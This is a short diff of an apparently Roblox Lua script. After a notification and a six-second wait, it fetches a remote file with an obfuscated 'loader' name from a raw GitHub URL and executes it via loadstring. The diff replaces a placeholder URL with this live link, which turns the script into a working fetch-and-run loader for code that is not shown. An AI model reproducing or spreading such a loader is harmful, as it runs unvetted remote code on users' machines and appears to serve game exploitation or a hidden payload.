@@ -9,4 +9,4 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 })
 
 task.wait(6)
-loadstring(game:HttpGet("URL_DE_TU_SCRIPT_AQUI"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vFailed/Raw/refs/heads/main/0xbf-7x9z-3x12-6x8%24-loader.lua"))()
